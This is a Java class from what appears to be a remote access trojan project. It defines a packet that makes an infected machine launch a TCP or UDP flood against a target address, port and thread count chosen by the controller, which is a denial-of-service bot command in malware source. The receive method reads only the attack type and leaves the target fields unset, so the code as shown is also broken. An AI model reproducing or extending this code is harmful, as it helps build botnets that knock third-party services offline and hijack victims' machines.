package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.attack.AttackUtils;

public final class AttackPacket implements IPacket {
	
	private byte type;
	private String address;
	
	private int port;
	private long duration;
	private int threads;
	
	public static final byte TCP = 0;
	public static final byte UDP = 1;
	
	public AttackPacket(final byte type, final String address, final int port, final long duration, final int threads) {
		this.type = type;
		this.address = address;
		this.port = port;
		this.duration = duration;
		this.threads = threads;
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeByte(type);
		connection.writeUTF(address);
		connection.writeInt(port);
		connection.writeLong(duration);
		connection.writeInt(threads);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		type = connection.readByte();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		if (type == TCP) {
			AttackUtils.launchTcpWave(address, port, threads);
		} else if (type == UDP) {
			AttackUtils.launchUdpFlood(address, duration);
		}
	}
	
}
